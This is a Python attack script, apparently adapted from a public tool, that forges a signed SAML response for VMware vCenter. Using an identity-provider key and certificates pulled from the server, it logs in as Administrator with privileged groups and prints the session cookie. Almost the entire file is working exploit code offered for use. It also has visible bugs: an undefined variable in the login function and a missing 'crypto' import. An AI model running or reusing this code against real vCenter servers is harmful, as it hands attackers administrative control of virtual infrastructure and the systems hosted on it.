#!/usr/bin/env python3

import base64
import sys
import zlib
from urllib.parse import parse_qs, quote, unquote, urlparse
import socket
import ssl
import lxml.etree as etree
import requests
import urllib3
from signxml import XMLSignatureProcessor, XMLSigner
from datetime import datetime
from dateutil.relativedelta import relativedelta
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SAML_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
  </saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>
    <saml2:Subject>
      <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
      <saml2:ProxyRestriction Count="10"/>
      <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
      <saml2:AudienceRestriction>
        <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
      </saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT" SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea" SessionNotOnOrAfter="$NOT_AFTER">
      <saml2:AuthnContext>
        <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
    </saml2:AuthnStatement>
    <saml2:AttributeStatement>
      <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
      </saml2:Attribute>
    </saml2:AttributeStatement>
  </saml2:Assertion>
</saml2p:Response>
"""

def saml_request(vcenter):
    """Get SAML AuthnRequest from vCenter web UI"""
    try:
        print(f'[*] Initiating SAML request with {vcenter}')
        r = requests.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        o = urlparse(r.headers["location"])
        sr = parse_qs(o.query)["SAMLRequest"][0]
        dec = base64.decodebytes(sr.encode("utf-8"))
        req = zlib.decompress(dec, -8)
        return etree.fromstring(req)
    except:
        print(f'[-] Failed initiating SAML request with {vcenter}')
        raise

def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
    """Fill in the SAML response template"""
    try:
        print('[*] Generating SAML assertion') 
        # Generate valid timestamps
        before = (datetime.today() + relativedelta(months=-1)).isoformat()[:-3]+'Z'
        after = (datetime.today() + relativedelta(months=1)).isoformat()[:-3]+'Z'

        # Replace fields dynamically
        t = SAML_TEMPLATE
        t = t.replace("$VCENTER_IP", vcenter_ip)
        t = t.replace("$VCENTER", vcenter_hostname)
        t = t.replace("$DOMAIN", vcenter_domain)
        t = t.replace("$ID", req.get("ID"))
        t = t.replace("$ISSUEINSTANT", req.get("IssueInstant"))
        t = t.replace("$NOT_BEFORE", before)
        t = t.replace("$NOT_AFTER", after)
        return etree.fromstring(t.encode("utf-8"))
    except:
        print('[-] Failed generating the SAML assertion')
        raise

def sign_assertion(root, key, cert1, cert2):
    """Sign the SAML assertion in the response using the IdP key"""
    try:
        print('[*] Signing the SAML assertion')
        assertion_id = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get("ID")
        signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
        signed_assertion = signer.sign(root, reference_uri=assertion_id, key=key, cert=[cert1, cert2])
        return signed_assertion
    except:
        print('[-] Failed signing the SAML assertion')
        raise

def login(vcenter, saml_resp):
    """Log in to the vCenter web UI using the signed response and return a session cookie"""
    try:
        print('[*] Attempting to log into vCenter with the signed SAML request')
        resp = etree.tostring(s, xml_declaration=True, encoding="UTF-8", pretty_print=False)
        r = requests.post(
            f"https://{vcenter}/ui/saml/websso/sso",
            allow_redirects=False,
            verify=False,
            data={"SAMLResponse": base64.encodebytes(resp)},
        )
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        cookie = r.headers["Set-Cookie"].split(";")[0]
        print(f'[+] Successfuly obtained Administrator cookie for {vcenter}!')
        print(f'[+] Cookie: {cookie}')
    except:
        print('[-] Failed logging in with SAML request')
        raise

def get_hostname(vcenter):
    try:
        print('[*] Obtaining hostname from vCenter SSL certificate')
        dst = (vcenter, 443)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(dst)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=dst[0])

        # get certificate
        cert_bin = s.getpeercert(True)
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
        hostname = x509.get_subject().CN
        print(f'[*] Found hostname {hostname} for {vcenter}')
        return hostname
    except:
        print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
        raise

if __name__ == '__main__':
    if len(sys.argv)!=7:
        print('vCenter_GenerateLoginCookie.py')
        print('Modified from https://github.com/horizon3ai/vcenter_saml_login')
        print('It is recommended to use under Kali')
        print('Usage:')
        print('%s <target> <hostname> <domain> <idp_cert path> <trusted_cert_1 path> <trusted_cert_2 path>'%(sys.argv[0]))
        print('Note:')
        print('hostname: You can get the hostname from vCenter SSL certificate')
        print('domain: You can get the domain from vCenter_ExtraCertFromMdb.py')
        print('idp_cert path: You can get the idp_cert path from vCenter_ExtraCertFromMdb.py')
        print('trusted_cert_1 path: You can get the trusted_cert_1 path from vCenter_ExtraCertFromMdb.py')
        print('trusted_cert_2 path: You can get the trusted_cert_2 path from vCenter_ExtraCertFromMdb.py')
        print('Eg.')
        print('%s 192.168.1.1 192.168.1.1 test.com idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt'%(sys.argv[0])) 
        sys.exit(0)
    else:
        req = saml_request(sys.argv[1])
        t = fill_template(sys.argv[2], sys.argv[1], sys.argv[3],req)
        with open(sys.argv[4], 'r') as file_obj:
            content1 = file_obj.read()
        with open(sys.argv[5], 'r') as file_obj:
            content2 = file_obj.read()
        with open(sys.argv[6], 'r') as file_obj:
            content3 = file_obj.read()
        s = sign_assertion(t, content1, content2, content3)
        c = login(sys.argv[1], s)



